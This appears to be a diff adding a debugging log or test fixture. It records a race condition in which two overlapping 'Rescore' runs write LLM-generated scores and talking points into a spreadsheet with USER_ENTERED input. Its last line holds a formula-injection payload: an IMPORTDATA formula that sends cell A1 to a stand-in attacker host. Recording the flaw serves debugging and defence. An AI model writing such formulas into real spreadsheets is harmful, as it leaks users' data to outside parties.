@@ -1,0 +1,8 @@
+t0: user saves profile A, clicks Rescore (run A)
+t+50ms: user saves profile B, clicks Rescore again (run B) — no lock, both run
+run A result {"rescored":3,"skipped":0,"failed":0,"total":3}
+run B result {"rescored":3,"skipped":0,"failed":0,"total":3}
+LLM calls: 6 Sheet batchUpdate writes: 6 valueInputOption: USER_ENTERED
+Final Fit Score cells (H2..H4): 2, 2, 2 <- profile B (newest) expected 9
+Final Talking Points Q2: old angle
+Talking Points values sent with USER_ENTERED, in write order: ["=IMPORTDATA(\"https://attacker.invalid/?q=\"&A1)","=IMPORTDATA(\"https://attacker.invalid/?q=\"&A1)","=IMPORTDATA(\"https://attacker.invalid/?q=\"&A1)","old angle","old angle","old angle"]
